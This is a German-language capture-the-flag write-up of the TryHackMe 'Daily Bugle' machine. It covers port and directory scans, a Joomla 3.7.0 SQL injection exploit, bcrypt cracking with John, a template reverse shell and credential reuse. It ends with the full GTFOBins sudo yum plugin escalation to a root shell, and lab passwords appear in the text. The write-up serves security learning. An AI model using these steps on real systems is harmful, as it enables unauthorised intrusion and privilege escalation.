# Ziel 10.10.126.91

# Scanning
## Nmap 

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
MAC Address: 02:4F:86:41:03:09 (Unknown)

```
-> Website Vorhanden 
-> Maria db offen verfügbar?
# Enumeration
# Gobuster 

```
[+] Url:                     http://10.10.126.91
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 235] [--> http://10.10.126.91/images/]
/media                (Status: 301) [Size: 234] [--> http://10.10.126.91/media/]
/templates            (Status: 301) [Size: 238] [--> http://10.10.126.91/templates/]
/modules              (Status: 301) [Size: 236] [--> http://10.10.126.91/modules/]
/bin                  (Status: 301) [Size: 232] [--> http://10.10.126.91/bin/]
/plugins              (Status: 301) [Size: 236] [--> http://10.10.126.91/plugins/]
/includes             (Status: 301) [Size: 237] [--> http://10.10.126.91/includes/]
/language             (Status: 301) [Size: 237] [--> http://10.10.126.91/language/]
/components           (Status: 301) [Size: 239] [--> http://10.10.126.91/components/]
/cache                (Status: 301) [Size: 234] [--> http://10.10.126.91/cache/]
/libraries            (Status: 301) [Size: 238] [--> http://10.10.126.91/libraries/]
/tmp                  (Status: 301) [Size: 232] [--> http://10.10.126.91/tmp/]
/layouts              (Status: 301) [Size: 236] [--> http://10.10.126.91/layouts/]
/administrator        (Status: 301) [Size: 242] [--> http://10.10.126.91/administrator/]
/cli                  (Status: 301) [Size: 232] [--> http://10.10.126.91/cli/]
Progress: 218275 / 218276 (100.00%)

```

-> Adminportal? -> Joomla CMS

# SQLI versuch 

Aufgrund dessen das ich ein Admin Portal, eine Login maske auf der Normalen seite ud bekannterweise eine Maria db habe habe ich versucht via SQLi zugriff zu erhalten 

ohne Erfolg

# Weitere Enumeration 

Um vielleicht einen Exploit zu Finden habe ich in Google geschaut ob ich irgendwie die Version des CMS herausbekomme ohne angemeldet zu sein, und siehe da eine der Antworten beinhaltete das es über den Pfad "/administrator/manifests/files/joomla.xml" möglich ist und siehe da auf dem Ziel läuft Joomla CMS Version 3.7.0

# Exploiting 

Hier habe ich durch Searchsploit einen Exploit für Joomla 3.7.0 gefunden "# Joomla! 3.7.0 - 'com_fields' SQL Injection" alias " EDB-ID: 42033"

Nach etwas Rumexperimentieren habe ich diesen nicht zum laufen bekommen- 

Daraufhin habe ich weiter geschaut ob es vllt alternativen gibt und bin auf Github fündig geworden 

https://github.com/XiphosResearch/exploits/tree/master/Joomblah

Diesen habe ich dann geladen und ausgeführt und einen PW Hash und username bekommen

Screenshot da mir die Attackbox gestorben ist :(

https://imgur.com/hdpDqNb

Da wir jetzt einen PW hash haben müssen wir den auch knacken 

Tatsächlich kennt Hash.com den Hash bereits und kann ihn lösen. Das ist aber Langweilig. 

Via https://www.tunnelsup.com/hash-analyzer/

Bekommen wir dann die Info das es bcrypt ist was dann zu "--format=bcrypt" bei john the Ripper Corespondiert

```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
```

nach einer kurzen zeit bekommen wir dann auch das PW: spiderman123

Username: jonah
Passoword: spiderman123
Email: jonah@tryhackme.com

Nach dem Anmelden können wir uns etwas umschauen. Am Intressantesten scheinen die Templates, da wir hier Custom php code laden können. Ich nutze hier das beez3 Template und die Pentestmonkey revshell

Hier passe ich die Index.html an und füge die Revshell ein. Starte einen listener und speicher die index.html. Danach lasse ich mir die Vorschau anzeigen und erhalte meine Rev shell

# Priv Escalation

Nachdem ich bei den üblichen sachen (SUID, Crontabs, etc ) nichts gefunden habe habe ich mich etwas auf dem Server umgeschaut und habe was intressantes unter /var/www/html gefunden undzwar in der "configuration.php" sind logindaten hinterlegt 

```
	public $user = 'root';
	public $password = 'nv5uz9r3ZEDzVjNu';
```

Versuch bei Root anzumelden -> Ohne erfolg 
Allerdings kennen wir User "Jjameson" aus dem /home Verzeichniss -> loginversuch mit dem PW -> Erfolg



## Auf Root
Da wir jetzt einen neuen user haben geht das Spiel von Forne los mit der Enumeration 

Cool wir werden auf anhieb fündig. Wir können yum mit root rechten ausführen

```
[jjameson@dailybugle ~]$ sudo -l
sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum

```

Also schauen auf gtfobins.github.io was wir damit anstellen können

daraufhin finden wir 

```

TF=$(mktemp -d)

cat >$TF/x<<EOF

[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF

[main]
enabled=1
EOF

cat >$TF/y.py<<EOF

import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```


Das Führen wir genauso aus und Tadaa wir haben root
